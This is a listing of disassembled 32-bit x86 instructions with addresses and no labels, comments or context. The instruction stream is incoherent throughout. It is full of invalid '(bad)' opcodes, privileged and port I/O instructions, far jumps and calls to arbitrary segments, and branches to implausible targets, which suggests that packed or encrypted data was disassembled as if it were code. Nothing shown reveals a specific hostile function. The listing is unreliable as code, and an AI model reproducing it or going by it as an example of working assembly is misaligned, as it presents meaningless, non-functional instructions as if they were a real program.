  419269:	scas   eax,DWORD PTR es:[edi]
  41926a:	and    DWORD PTR ds:0x8d63e5da,0x9a8ce883
  419274:	cdq    
  419275:	rcl    BYTE PTR [edx],1
  419277:	outs   dx,BYTE PTR ds:[esi]
  419278:	fidivr WORD PTR [edi+edi*1+0x3a]
  41927c:	fld    QWORD PTR [edi+0x38701b74]
  419282:	repnz mov dh,0x78
  419285:	sub    ebx,ecx
  419287:	iret   
  419288:	pop    es
  419289:	js     0x4192ed
  41928b:	inc    esi
  41928c:	cdq    
  41928d:	pop    edx
  41928e:	inc    ebp
  41928f:	push   ebp
  419290:	mov    DWORD PTR [bp+si-0x5364],esi
  419295:	push   0x5181a001
  41929a:	icebp  
  41929b:	iret   
  41929c:	sti    
  41929d:	inc    edi
  41929e:	xor    al,0x47
  4192a1:	pop    esi
  4192a2:	xchg   DWORD PTR [eax],edx
  4192a4:	pop    edi
  4192a5:	or     BYTE PTR [esi+0x7f],bh
  4192a8:	imul   edi,DWORD PTR [ecx],0x741fccc8
  4192ae:	pop    ds
  4192af:	outs   dx,BYTE PTR ds:[esi]
  4192b0:	add    BYTE PTR [esi+0x56e0a0ba],ch
  4192b6:	leave  
  4192b7:	outs   dx,DWORD PTR ds:[esi]
  4192b8:	jbe    0x419313
  4192ba:	fld    QWORD PTR [ebp+0x67]
  4192bd:	pop    esp
  4192be:	dec    esp
  4192bf:	sbb    eax,0x15314260
  4192c4:	out    0x7a,al
  4192c6:	adc    dh,BYTE PTR [esi]
  4192c8:	push   edi
  4192c9:	add    al,0xb5
  4192cb:	retf   0x8892
  4192ce:	pop    edx
  4192cf:	push   ss
  4192d0:	jge    0x419306
  4192d2:	add    bl,BYTE PTR [edx]
  4192d4:	ret    
  4192d5:	ret    0xb3be
  4192d8:	add    eax,0x55ff5c2c
  4192dd:	loop   0x4192e9
  4192df:	retf   0xdcb9
  4192e2:	arpl   WORD PTR [ecx-0x1c554f14],bx
  4192e8:	loope  0x419337
  4192ea:	test   ebp,esi
  4192ec:	pusha  
  4192ed:	aaa    
  4192ee:	fisub  WORD PTR es:[ebp+0x1fdd0ad7]
  4192f5:	test   DWORD PTR [edx+0x76ecfa6d],ecx
  4192fb:	data16 jns 0x419359
  4192fe:	xchg   ebx,eax
  4192ff:	mov    edx,0x6e0d0ad7
  419304:	mov    ebx,0xc2400b32
  419309:	push   ds
  41930a:	push   eax
  41930b:	xlat   BYTE PTR ds:[ebx]
  41930c:	xchg   ebx,eax
  41930d:	(bad)  
  41930e:	and    al,0xc9
  419310:	aam    0xfe
  419312:	jbe    0x41933c
  419314:	cli    
  419315:	int3   
  419316:	ffreep st(0)
  419318:	add    dh,BYTE PTR [esi]
  41931a:	mov    dl,0xee
  41931c:	mov    al,0x95
  41931e:	dec    ebp
  41931f:	xchg   DWORD PTR [edi],esi
  419321:	adc    BYTE PTR gs:[eax],dh
  419324:	shr    DWORD PTR ds:0x92ba1c32,1
  41932a:	sbb    cl,dh
  41932c:	test   BYTE PTR ss:[esi-0x5164d598],dh
  419333:	pop    es
  419334:	call   0xa5cb:0xd493c36a
  41933b:	outs   dx,DWORD PTR ds:[esi]
  41933c:	xchg   esi,eax
  41933d:	in     al,0xff
  41933f:	lods   al,BYTE PTR ds:[esi]
  419340:	and    ecx,DWORD PTR [edi-0x14b0c2f2]
  419346:	jae    0x4192d4
  419348:	mov    ds:0x48b75e55,al
  41934d:	ret    
  41934e:	xchg   edi,eax
  41934f:	sub    dl,0xbb
  419352:	jle    0x4192fa
  419354:	mov    ds:0xc04afb77,al
  419359:	outs   dx,DWORD PTR ds:[esi]
  41935a:	fcmove st,st(1)
  41935c:	in     eax,0x40
  41935e:	fstp   DWORD PTR [eax+0x7ad73787]
  419364:	cwde   
  419365:	sub    al,0xe5
  419367:	mov    ecx,0xa22af44e
  41936c:	into   
  41936d:	jp     0x419387
  41936f:	mov    ah,0x84
  419371:	cmc    
  419372:	dec    eax
  419373:	stc    
  419374:	repz jo 0x419350
  419377:	loope  0x419360
  419379:	add    esi,ebx
  41937b:	outs   dx,DWORD PTR ds:[esi]
  41937c:	xor    DWORD PTR [ebp-0xd9e7164],eax
  419382:	sbb    eax,edx
  419384:	ret    0xba00
  419387:	mov    ebx,0x9cd1f817
  41938c:	or     bl,bh
  41938e:	inc    esi
  41938f:	je     0x41932a
  419391:	or     DWORD PTR [ecx],edi
  419393:	ja     0x41933e
  419395:	mov    al,0x32
  419397:	push   ds
  419398:	adc    ecx,0xffffffeb
  41939b:	jmp    0xb5d9148a
  4193a0:	nop
  4193a1:	rcl    BYTE PTR fs:[ebp-0x12],1
  4193a5:	ret    
  4193a6:	call   0x881c:0x77a91cc5
  4193ad:	xor    DWORD PTR [ebp-0x4c],ecx
  4193b0:	mov    ds:0xa0760ca7,al
  4193b5:	xor    DWORD PTR [eax+esi*4+0x4a],edi
  4193b9:	xchg   ebp,eax
  4193ba:	push   ss
  4193bb:	push   0xe014a916
  4193c0:	cmp    edi,edx
  4193c2:	retf   
  4193c3:	shr    DWORD PTR fs:[ebx+edx*2-0x13],1
  4193c8:	mov    dh,0x35
  4193ca:	mov    esi,0x1bf2faa4
  4193cf:	jbe    0x4193b0
  4193d1:	push   ebx
  4193d2:	push   0xf92dcba8
  4193d7:	inc    ecx
  4193d8:	xor    dl,BYTE PTR [ebx]
  4193da:	dec    edx
  4193db:	and    al,0xe6
  4193dd:	daa    
  4193de:	pop    edx
  4193df:	push   0x6ef6084a
  4193e4:	mov    esp,0x60b00eb6
  4193e9:	mov    dl,0x45
  4193eb:	cmc    
  4193ec:	pop    es
  4193ed:	xchg   ebp,eax
  4193ee:	push   0x0
  4193f0:	add    dh,BYTE PTR [ebx+0x7b3d3bc]
  4193f6:	inc    BYTE PTR [eax]
  4193f8:	xor    cl,BYTE PTR [ebp-0x5900e8d1]
  4193fe:	and    bl,BYTE PTR [edx-0xd6f1cc1]
  419404:	loope  0x419434
  419406:	fiadd  DWORD PTR [eax-0x6ca2df85]
  41940c:	js     0x41944b
  41940e:	push   esp
  419410:	out    dx,eax
  419411:	std    
  419412:	ins    BYTE PTR es:[edi],dx
  419413:	sub    bh,bl
  419415:	test   BYTE PTR ds:0xff37569e,bh
  41941b:	std    
  41941c:	inc    ebx
  41941d:	cmp    DWORD PTR [edi+0x5826b27d],esi
  419423:	cmp    DWORD PTR [ecx-0x63],ebx
  419426:	jnp    0x419419
  419428:	cmp    DWORD PTR [esp+edx*8+0x28],esi
  41942c:	jmp    0x419476
  41942e:	jne    0x4193d0
  419430:	fbstp  TBYTE PTR [ebx-0xb]
  419433:	xchg   esp,eax
  419434:	or     BYTE PTR [ebp-0x4c],dl
  419437:	cmp    DWORD PTR [ebx-0x2b],esi
  41943a:	mov    cl,0xdd
  41943c:	mov    cs,WORD PTR [edx+eiz*4-0x56]
  419440:	jae    0x4194ab
  419442:	outs   dx,DWORD PTR ds:[esi]
  419443:	sub    edi,DWORD PTR [bx+si]
  419446:	jmp    0xacff1971
  41944b:	dec    ebp
  41944c:	int    0xf8
  41944e:	into   
  41944f:	sti    
  419450:	mov    ds:0xfb80c069,al
  419455:	xor    DWORD PTR [ebx+0x1a02a399],esi
  41945b:	int    0x63
  41945d:	sahf   
  41945e:	adc    ebx,DWORD PTR [ebx+0x67c04e61]
  419464:	jae    0x419425
  419466:	sar    DWORD PTR [edx+0x16],0x8f
  41946a:	fcmovnu st,st(6)
  41946c:	mov    dl,0xf5
  41946e:	out    0x18,al
  419470:	popf   
  419471:	gs (bad) 
  419473:	outs   dx,BYTE PTR ds:[esi]
  419474:	xchg   ecx,eax
  419475:	jecxz  0x419419
  419477:	sbb    BYTE PTR [ecx+0x18],bl
  41947a:	and    al,0x32
  41947c:	mov    edi,0xbc930889
  419481:	add    al,0x5
  419484:	mov    al,ds:0xe45da027
  419489:	(bad)  
  41948a:	fdiv   DWORD PTR [ebp-0x27dfa5c1]
  419490:	sahf   
  419491:	ss add bh,dh
  419494:	adc    eax,0x0
	...
  419511:	add    BYTE PTR [eax],al
  419513:	add    BYTE PTR [esp+ebp*2],bl
  419516:	ins    DWORD PTR es:[edi],dx
  419517:	les    edi,FWORD PTR [ebp-0x3b]
  41951a:	mov    ebp,0x7e8bcdfc
  41951f:	jae    0x4194db
  419521:	push   ds
  419522:	pop    edx
  419523:	mov    eax,ds:0x1359d
  419528:	imul   eax,DWORD PTR [edi],0x41c90000
  41952e:	mov    eax,ds:0x8c0cf54b
  419533:	xchg   bh,dl
  419535:	das    
  419536:	inc    esi
  419537:	(bad)  
  419538:	xchg   esp,eax
  419539:	les    edx,FWORD PTR [edx]
  41953b:	stos   DWORD PTR es:[edi],eax
  41953c:	fs jg  0x4195b2
  41953f:	je     0x4195ad
  419541:	mov    esp,0x58e90c9f
  419546:	icebp  
  419547:	retf   0x2689
  41954a:	mov    ah,0x57
  41954c:	push   esi
  41954d:	div    DWORD PTR [edi-0x63b520ed]
  419553:	or     cl,dl
  419555:	out    0x6f,al
  419557:	fwait
  419558:	stc    
  419559:	cwde   
  41955a:	rcl    eax,cl
  41955c:	hlt    
  41955d:	sub    al,0x8d
  41955f:	sbb    dh,ah
  419561:	push   esp
  419562:	jmp    0x8990fd6a
  419567:	sub    dh,BYTE PTR cs:[eax+0x37]
  41956b:	pop    ss
  41956c:	add    DWORD PTR [ebp+0x67bd0353],eax
  419572:	out    0xa6,al
  419574:	mov    ch,0xa0
  419576:	mov    cl,0x64
  419578:	retf   0xfdf5
  41957b:	ficom  DWORD PTR [ebx-0xb]
  41957e:	out    dx,eax
  41957f:	loope  0x419526
  419581:	pop    ebp
  419582:	out    0xdc,eax
  419584:	lea    esi,[esi-0x5d]
  419587:	and    ebp,DWORD PTR [esi+0x1d0a39]
  41958d:	data16 repz or al,BYTE PTR [ebp+0x3a4a86c7]
  419595:	stos   BYTE PTR es:[edi],al
  419596:	and    al,0xe0
  419598:	test   cl,ah
  41959a:	in     eax,dx
  41959b:	cmp    eax,edi
  41959d:	sub    eax,0xeacb8420
  4195a2:	mov    WORD PTR [ecx-0x1d0690b6],fs
  4195a8:	int    0x4e
  4195aa:	xchg   esp,eax
  4195ab:	mov    al,ds:0xdc623d1f
  4195b0:	jae    0x41960c
  4195b2:	xor    eax,0x5df7a6c0
  4195b7:	jb     0x41956d
  4195b9:	push   edx
  4195ba:	setns  al
  4195bd:	sub    ebp,0x2202933
  4195c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195c4:	lea    ebx,[ebp+0x68]
  4195c7:	(bad)  
  4195c8:	icebp  
  4195c9:	xchg   ecx,ebx
  4195cb:	fidiv  WORD PTR ds:0x90624e6a
  4195d1:	ret    
  4195d2:	or     dl,BYTE PTR [edi+0x4d]
  4195d5:	das    
  4195d6:	jmp    0x7d4f:0xcae16576
  4195dd:	xor    al,0xd3
  4195df:	pop    ss
  4195e0:	pushf  
  4195e1:	push   es
  4195e2:	xor    eax,0xed4db551
  4195e7:	addr16 (bad) 
  4195e9:	shl    DWORD PTR [ebp+0x467dbc6c],0xf6
  4195f0:	popf   
  4195f1:	pop    ebp
  4195f2:	(bad)  
  4195f3:	std    
  4195f4:	xlat   BYTE PTR ds:[ebx]
  4195f5:	and    al,0x81
  4195f7:	or     eax,0x98b1ef25
  4195fc:	mov    dl,0x6
  4195fe:	into   
  4195ff:	pop    eax
  419600:	push   edi
  419601:	cmp    ebx,DWORD PTR [esi-0x44]
  419604:	cmp    eax,0xf56dec13
  419609:	in     al,dx
  41960a:	lods   al,BYTE PTR ds:[esi]
  41960b:	mov    cl,0x5e
  41960d:	dec    eax
  41960e:	mov    cl,0xf3
  419610:	hlt    
  419611:	arpl   WORD PTR [edi],ax
  419613:	jo     0x41966a
  419615:	aad    0xd2
  419617:	mov    edi,0xa37863ca
  41961c:	outs   dx,BYTE PTR ds:[esi]
  41961d:	mov    dl,0x4b
  41961f:	mov    BYTE PTR [ecx+0x5d],bh
  419622:	(bad)  
  419623:	mov    ds:0x6b4f6811,eax
  419628:	in     al,dx
  419629:	mov    DWORD PTR [edi],ebp
  41962b:	jmp    0x36c270d2
  419630:	sbb    edx,DWORD PTR [esi+edx*4]
  419633:	mov    edi,0x71b84cc8
  419638:	or     al,0xbd
  41963a:	pop    ebp
  41963b:	das    
  41963c:	xchg   ebx,eax
  41963d:	and    cl,cl
  41963f:	push   esp
  419640:	fdivp  st(1),st
  419642:	ret    
  419643:	bound  eax,QWORD PTR [eax]
  419645:	dec    ebx
  419646:	mov    esp,0x6cb29c4f
  41964b:	pop    ss
  41964c:	add    DWORD PTR [eax+eiz*8-0x7],0x877602c8
  419654:	xchg   ebp,eax
  419655:	xlat   BYTE PTR ds:[ebx]
  419656:	push   eax
  419657:	clc    
  419658:	mov    WORD PTR [ebp+0x3f629939],?
  41965e:	mov    ecx,0x9835c3a
  419663:	pop    esi
  419664:	mov    al,0x33
  419666:	inc    edi
  419667:	in     eax,0xcb
  419669:	adc    eax,0xbc1b91e2
  41966e:	mov    ch,0xf
  419670:	sbb    edi,DWORD PTR [ebp-0x3c]
  419673:	jecxz  0x4196b5
  419675:	mov    ah,0x3a
  419677:	inc    edx
  419678:	and    BYTE PTR [ebx-0x67],ch
  41967b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41967c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41967d:	jns    0x419642
  41967f:	popf   
  419680:	inc    esi
  419681:	je     0x4196c7
  419683:	enter  0x87b8,0x69
  419687:	mov    eax,ds:0xec69340b
  41968c:	imul   ch
  41968e:	(bad)  
  41968f:	(bad)  [ebx+0x15]
  419692:	scas   al,BYTE PTR es:[edi]
  419693:	jns    0x41964e
  419695:	aas    
  419696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419697:	je     0x4196f2
  419699:	mov    esp,0x2f942c55
  41969e:	push   ds
  41969f:	ss test esp,ecx
  4196a2:	jae    0x4196c1
  4196a4:	cdq    
  4196a5:	or     edi,eax
  4196a7:	inc    ecx
  4196a8:	xchg   BYTE PTR [ebx],cl
  4196aa:	dec    ebp
  4196ab:	and    cl,BYTE PTR [ebp-0x7393fbe8]
  4196b1:	xchg   ebp,eax
  4196b2:	lods   al,BYTE PTR ds:[esi]
  4196b3:	retf   0x519
  4196b6:	pop    ds
  4196b7:	pop    ss
  4196b8:	rcr    DWORD PTR [edi+0x1d],cl
  4196bb:	sti    
  4196bc:	jge    0x419706
  4196be:	or     ah,bh
  4196c0:	in     al,dx
  4196c1:	mov    ecx,0x60a1057b
  4196c6:	scas   eax,DWORD PTR es:[edi]
  4196c7:	dec    edx
  4196c8:	ds out 0x85,al
  4196cb:	ins    DWORD PTR es:[edi],dx
  4196cc:	into   
  4196cd:	jp     0x419695
  4196cf:	fld    TBYTE PTR [eax]
  4196d1:	mov    esi,0x79346be1
  4196d6:	sar    BYTE PTR [edi-0x1b],1
  4196d9:	lods   al,BYTE PTR ds:[esi]
  4196da:	pop    edi
  4196db:	fsub   DWORD PTR [eax-0x15985db6]
  4196e1:	mov    ebx,0x5d0cdfba
  4196e6:	ret    
  4196e7:	mov    cl,0x88
  4196e9:	addr16 sbb bh,al
  4196ec:	jp     0x419750
  4196ee:	mov    esi,0x6083cdf1
  4196f3:	out    dx,eax
  4196f4:	aad    0x78
  4196f6:	out    0x41,eax
  4196f8:	mov    ecx,0x984538c6
  4196fd:	or     al,0xe3
  4196ff:	xor    al,0x23
  419701:	pop    ss
  419702:	in     eax,0x97
  419704:	inc    edx
  419705:	cli    
  419706:	push   ecx
  419707:	or     eax,0x46ce1839
  41970c:	(bad)  
  41970d:	cmp    DWORD PTR [esi],ebx
  41970f:	adc    eax,0xd1af6f49
  419714:	and    al,0x32
  419716:	push   ds
  419717:	pop    ss
  419718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419719:	add    al,0xdc
  41971b:	es call 0x7f2a1e62
  419721:	jb     0x4196b8
  419723:	push   ebp
  419724:	fcom   QWORD PTR [ebx-0x1b8c882e]
  41972a:	adc    ebp,DWORD PTR [ecx]
  41972c:	xchg   esp,eax
  41972d:	add    al,0x30
  41972f:	fsub   st(3),st
  419731:	xor    eax,0xf7bb9447
  419736:	push   esi
  419737:	cmp    BYTE PTR [edx-0x40b4f6d6],al
  41973d:	je     0x4196d5
  41973f:	fisubr DWORD PTR [edx+0x52]
  419742:	enter  0xce39,0xdd
  419746:	scas   al,BYTE PTR es:[edi]
  419747:	inc    esi
  419748:	in     al,0xa3
  41974a:	sbb    BYTE PTR [edx-0x2],bl
  41974d:	fnsave [edi-0x6d]
  419750:	dec    edi
  419751:	sahf   
  419752:	sub    ebp,DWORD PTR [ebx-0x12]
  419755:	sub    ecx,DWORD PTR [ecx+edx*8-0x7023d4b9]
  41975c:	jb     0x4196f9
  41975e:	inc    esi
  41975f:	and    al,0x77
  419761:	and    edi,ebx
  419763:	push   0x97549fb9
  419768:	add    dl,BYTE PTR [ebx+0x69]
  41976b:	jno    0x419769
  41976d:	sahf   
  41976e:	pop    es
  41976f:	push   es
  419770:	clc    
  419771:	rol    DWORD PTR [edi+0x1c],0xda
  419775:	cmp    esp,DWORD PTR [edx+ecx*4]
  419778:	out    dx,al
  419779:	sbb    BYTE PTR [esi+ebp*4+0x7f],al
  41977d:	lods   al,BYTE PTR ds:[esi]
  41977e:	jp     0x4197db
  419780:	outs   dx,DWORD PTR ds:[esi]
  419781:	pushf  
  419782:	inc    ecx
  419783:	jbe    0x4197d5
  419785:	xchg   ebp,eax
  419786:	jb     0x419764
  419788:	loopne 0x41979a
  41978a:	add    BYTE PTR [edi],ch
  41978c:	sar    DWORD PTR es:[edx],1
  41978f:	push   esi
  419790:	ja     0x419782
  419792:	add    BYTE PTR [ebp-0x3a],dl
  419795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419796:	xlat   BYTE PTR ds:[ebx]
  419797:	(bad)  
  419798:	popw   es
  41979a:	dec    eax
  41979b:	dec    DWORD PTR [edi+0x24597cf2]
  4197a1:	jl     0x4197b5
  4197a3:	jge    0x41978f
  4197a5:	mov    bh,0x98
  4197a7:	and    BYTE PTR [ebx-0x324fe659],ah
  4197ad:	clc    
  4197ae:	or     ebx,eax
  4197b0:	(bad)  
  4197b1:	mov    ds,ecx
  4197b3:	pop    edi
  4197b4:	and    cl,bh
  4197b6:	push   edx
  4197b7:	mov    ecx,0x2ac6f665
  4197bc:	jmp    0x6167:0x16d0b50c
  4197c3:	fist   DWORD PTR [esi+ecx*2-0x24]
  4197c7:	int    0x99
  4197c9:	cli    
  4197ca:	icebp  
  4197cb:	mov    cl,0x7f
  4197cd:	jge    0x419816
  4197cf:	jp     0x4197b5
  4197d1:	call   0x8dde:0x7420a657
  4197d8:	add    edi,DWORD PTR [ebx+0x5c7e8248]
  4197de:	mov    cl,0x87
  4197e0:	jns    0x419803
  4197e2:	xchg   esi,eax
  4197e3:	mov    esp,0xd0175424
  4197e8:	pop    esp
  4197e9:	out    0x6d,al
  4197eb:	inc    ebp
  4197ec:	dec    ebp
  4197ed:	iret   
  4197ee:	inc    ebx
  4197ef:	and    ebp,DWORD PTR [esi+0x7a]
  4197f2:	pop    ebx
  4197f3:	cmp    DWORD PTR [ecx+0x14],ebx
  4197f6:	pop    ds
  4197f7:	cli    
  4197f8:	js     0x419852
  4197fa:	pop    edi
  4197fb:	mov    al,ds:0xd8eb26c2
  419800:	sbb    BYTE PTR [eax*2-0x41657500],ch
  419807:	sbb    eax,0xcaee7332
  41980c:	dec    eax
  41980d:	not    dl
  41980f:	into   
  419810:	cmp    BYTE PTR [ebx],ah
  419812:	popf   
  419813:	xor    eax,0xf14e55b0
  419818:	and    eax,0xb2d79379
  41981d:	mov    eax,ds:0x5decbc4b
  419822:	jbe    0x41988f
  419824:	add    al,0xb0
  419826:	hlt    
  419827:	xchg   edx,eax
  419828:	push   0xf9b8087
  41982d:	push   esi
  41982e:	bound  ebp,QWORD PTR [edx-0x2dcc14c1]
  419834:	mov    al,ds:0x14b5e622
  419839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41983a:	jns    0x4198a4
  41983c:	xchg   esp,eax
  41983d:	cmp    esi,ecx
  41983f:	pushf  
  419840:	adc    eax,0x267366fe
  419845:	iret   
  419846:	(bad)  
  419847:	push   edx
  419848:	adc    ah,BYTE PTR [edi]
  41984a:	xchg   ebx,eax
  41984b:	fsubr  st,st(2)
  41984d:	sbb    DWORD PTR [ecx],0xfb5d4c12
  419853:	lds    ebx,FWORD PTR [ecx+ecx*8+0x13]
  419857:	mov    al,ds:0xa1d51323
  41985c:	bound  esp,QWORD PTR [esi-0x2d91f64d]
  419862:	jno    0x41982f
  419864:	pcmpgtd mm3,mm6
  419867:	push   0xffffffa4
  419869:	inc    edx
  41986a:	jecxz  0x4198e3
  41986c:	ret    
  41986d:	mov    cl,0x77
  41986f:	sub    DWORD PTR [edx+0x32],ebx
  419872:	cdq    
  419873:	and    al,ah
  419875:	add    ebp,DWORD PTR [ebx+0x2eba704b]
  41987b:	mov    ds,WORD PTR [eax+ebp*1-0xf]
  41987f:	mov    ds,ebp
  419881:	push   esp
  419882:	addr16 push ds
  419884:	and    cl,BYTE PTR [ecx]
  419886:	or     DWORD PTR [edx-0x1d],esp
  419889:	mov    esi,0xdb0e5b0
  41988e:	scas   eax,DWORD PTR es:[edi]
  41988f:	das    
  419890:	cwde   
  419891:	or     al,0xf1
  419893:	add    DWORD PTR ds:0xd7314c73,esp
  419899:	xor    al,0x18
  41989b:	push   edi
  41989c:	cmp    ah,BYTE PTR [ecx+0x15c75e97]
  4198a2:	int3   
  4198a3:	xchg   esi,eax
  4198a4:	in     al,dx
  4198a5:	mov    dl,0x2f
  4198a7:	jb     0x4198e3
  4198a9:	jp     0x419866
  4198ab:	jmp    0xe890:0xd8a8ae8f
  4198b2:	xchg   edi,eax
  4198b3:	push   ds
  4198b4:	sbb    bl,bh
  4198b6:	xor    BYTE PTR ds:0x1d623d3,ch
  4198bc:	pop    edx
  4198bd:	std    
  4198be:	xlat   BYTE PTR ds:[ebx]
  4198bf:	fidiv  DWORD PTR [edx-0x2c7df805]
  4198c5:	loopne 0x419929
  4198c7:	fmul   st,st(3)
  4198c9:	cmp    BYTE PTR [esi+0x6a],cl
  4198cc:	retf   
  4198cd:	leave  
  4198ce:	jmp    0x32bd2962
  4198d3:	leave  
  4198d4:	cs pop esp
  4198d6:	push   ss
  4198d7:	push   ebx
  4198d8:	mov    edi,0x340becee
  4198dd:	lock add bh,BYTE PTR [eax]
  4198e0:	and    eax,0x60231f79
  4198e5:	mov    eax,ds:0x9d0c32d2
  4198ea:	stos   DWORD PTR es:[edi],eax
  4198eb:	dec    esi
  4198ec:	xor    eax,0x4b54579d
  4198f1:	jge    0x41995a
  4198f3:	rcl    DWORD PTR [edi],1
  4198f5:	and    BYTE PTR [edi-0x2a],bl
  4198f8:	jnp    0x4198aa
  4198fa:	cmp    al,0x25
  4198fc:	inc    esi
  4198fd:	popa   
  4198fe:	jb     0x4198ae
  419900:	push   eax
  419901:	int    0x3a
  419903:	cs sahf 
  419905:	in     al,dx
  419906:	fldenv [esi-0x47531ee2]
  41990c:	sub    ch,BYTE PTR [ecx-0x4043abd8]
  419912:	xchg   edx,eax
  419913:	repnz repnz arpl WORD PTR [edx-0x39bb3d97],ax
  41991b:	cld    
  41991c:	xchg   DWORD PTR [ecx-0x41],edx
  41991f:	jnp    0x419974
  419921:	lods   al,BYTE PTR ds:[esi]
  419922:	aas    
  419923:	and    eax,0x16ac6966
  419928:	mov    al,ds:0x60b4032a
  41992d:	iret   
  41992e:	lods   al,BYTE PTR ds:[esi]
  41992f:	ret    0x228c
  419932:	cmp    eax,0x2fd1075d
  419937:	jge    0x4198d9
  419939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41993a:	sar    ecx,0x45
  41993d:	jl     0x419908
  41993f:	js     0x4199a9
  419941:	cmp    ebp,DWORD PTR [ebp-0xc]
  419944:	div    BYTE PTR [esi]
  419946:	cmp    DWORD PTR [esi+0x6c555555],esp
  41994c:	test   esp,ebp
  41994e:	adc    al,0xb8
  419950:	add    ebp,ebx
  419952:	xor    eax,0x41a1eeea
  419957:	inc    eax
  419958:	test   BYTE PTR [edx],ch
  41995a:	out    0x56,al
  41995c:	repnz enter 0x23c8,0x16
  419961:	iret   
  419962:	push   edi
  419963:	test   eax,0x1a9bce85
  419968:	pop    ds
  419969:	sub    DWORD PTR [edi],esi
  41996b:	popa   
  41996c:	and    ebp,DWORD PTR [esp+eiz*2-0x70]
  419970:	xchg   edx,eax
  419971:	neg    edx
  419973:	cdq    
  419974:	lds    esp,FWORD PTR [edi]
  419976:	jns    0x41995e
  419978:	ret    0xb898
  41997b:	ror    DWORD PTR [edx+0x41],1
  41997e:	inc    ebp
  41997f:	cld    
  419980:	shr    DWORD PTR [eax+0x31],0x77
  419984:	nop
  419985:	out    0xa5,al
  419987:	enter  0x9d8b,0x36
  41998b:	stc    
  41998c:	or     BYTE PTR [edi+0xf869fd4],0x65
  419993:	and    al,0x6a
  419995:	jmp    0x4199d2
  419997:	xor    al,0x1f
  419999:	dec    eax
  41999a:	popf   
  41999b:	je     0x419979
  41999d:	adc    edx,DWORD PTR [ebx]
  41999f:	sbb    ecx,0xd
  4199a2:	push   ecx
  4199a3:	test   DWORD PTR [ecx+0x76667d54],edi
  4199a9:	fisttp WORD PTR [eax+0x20f634a8]
  4199af:	pop    ecx
  4199b0:	iret   
  4199b1:	and    dh,BYTE PTR [ecx]
  4199b3:	pop    ebp
  4199b4:	pop    ss
  4199b5:	xchg   edx,eax
  4199b6:	lea    ecx,[edx+0x7b3d5821]
  4199bc:	xor    esp,DWORD PTR ds:0x7bef83fd
  4199c2:	js     0x419a11
  4199c4:	in     eax,0x7e
  4199c6:	into   
  4199c7:	leave  
  4199c8:	adc    cl,BYTE PTR ss:[ebp-0x45a4e9ed]
  4199cf:	mov    WORD PTR [ebx-0x2b],ss
  4199d2:	pop    ecx
  4199d3:	xor    ebx,edx
  4199d5:	cwde   
  4199d6:	aas    
  4199d7:	leave  
  4199d8:	push   ebp
  4199d9:	xchg   ebp,ebx
  4199db:	aad    0x6
  4199dd:	and    DWORD PTR [edx+ecx*8+0x19],esi
  4199e1:	idiv   esi
  4199e3:	into   
  4199e4:	jecxz  0x419a38
  4199e6:	jp     0x419991
  4199e8:	sub    cl,BYTE PTR [ebx+0x1af03d1e]
  4199ee:	jge    0x4199d0
  4199f0:	and    edx,ebx
  4199f2:	fldcw  WORD PTR [esi-0x2f]
  4199f5:	add    edx,edi
  4199f7:	idiv   DWORD PTR [eax]
  4199f9:	jae    0x4199ce
  4199fb:	jns    0x4199a0
  4199fd:	aaa    
  4199fe:	outs   dx,BYTE PTR ds:[esi]
  4199ff:	jae    0x419993
  419a01:	ja     0x419a48
  419a03:	cmp    ecx,DWORD PTR [esi+0x60ad9f42]
  419a09:	pop    eax
  419a0a:	and    BYTE PTR [ecx+0x7cc59432],bl
  419a10:	sub    al,0xc
  419a12:	shl    esp,cl
  419a14:	sub    ebx,DWORD PTR [edx]
  419a16:	in     al,dx
  419a17:	cmp    eax,0x385d0dc2
  419a1c:	stos   BYTE PTR es:[edi],al
  419a1d:	popf   
  419a1e:	shl    DWORD PTR [edi-0x65],1
  419a21:	int    0xd5
  419a23:	fs jecxz 0x4199cf
  419a26:	push   ds
  419a27:	dec    edx
  419a28:	sub    DWORD PTR [esi+0x3a],edi
  419a2b:	xor    al,0xa1
  419a2d:	xor    bl,ch
  419a2f:	fbstp  TBYTE PTR [esi-0x2f1320ad]
  419a35:	sub    DWORD PTR [edx],edx
  419a37:	lock add dl,BYTE PTR [ecx+0x24d04524]
  419a3e:	inc    edi
  419a3f:	jns    0x4199ff
  419a41:	ins    BYTE PTR es:[edi],dx
  419a42:	enter  0x15c1,0xee
  419a46:	mov    ds:0x4e274873,al
  419a4b:	sub    cl,BYTE PTR [edi+0x2ed408a4]
  419a51:	xchg   ebp,eax
  419a52:	ins    DWORD PTR es:[edi],dx
  419a53:	sti    
  419a54:	test   eax,0x95e7378a
  419a59:	nop
  419a5a:	aaa    
  419a5b:	fild   WORD PTR [edx]
  419a5d:	inc    ebx
  419a5e:	stos   BYTE PTR es:[edi],al
  419a5f:	adc    DWORD PTR ds:0x57af09ea,esi
  419a65:	xchg   esi,eax
  419a66:	xor    BYTE PTR [esi-0x76],bh
  419a69:	neg    BYTE PTR [eax]
  419a6b:	pop    eax
  419a6c:	and    bl,BYTE PTR [ebx+eiz*2]
  419a6f:	call   0xb647:0x5960b9b6
  419a76:	stos   BYTE PTR es:[edi],al
  419a77:	int3   
  419a78:	jl     0x419a31
  419a7a:	mov    ebp,0x19276f26
  419a7f:	stc    
  419a80:	mov    bl,0xca
  419a82:	std    
  419a83:	test   eax,0x15abaab
  419a88:	cmc    
  419a89:	repnz in al,0x65
  419a8c:	xor    dl,BYTE PTR ds:0xaae13fdd
  419a92:	(bad)  [ecx]
  419a94:	xchg   edx,eax
  419a95:	xchg   ebx,eax
  419a96:	repnz test eax,0xf6004ebd
  419a9c:	dec    edi
  419a9d:	adc    DWORD PTR [ebx+0x562cc730],ecx
  419aa3:	dec    ebp
  419aa4:	and    ch,BYTE PTR [edi]
  419aa6:	hlt    
  419aa7:	fld    DWORD PTR [edi-0x45]
  419aaa:	fisub  WORD PTR [edi]
  419aac:	jg     0x419a3c
  419aae:	(bad)  
  419aaf:	idiv   BYTE PTR [ebx]
  419ab1:	push   ss
  419ab2:	js     0x419a67
  419ab4:	dec    esp
  419ab5:	int    0xf3
  419ab7:	loopne 0x419ae5
  419ab9:	imul   ebp,DWORD PTR [eax],0x16b870c2
  419abf:	out    dx,eax
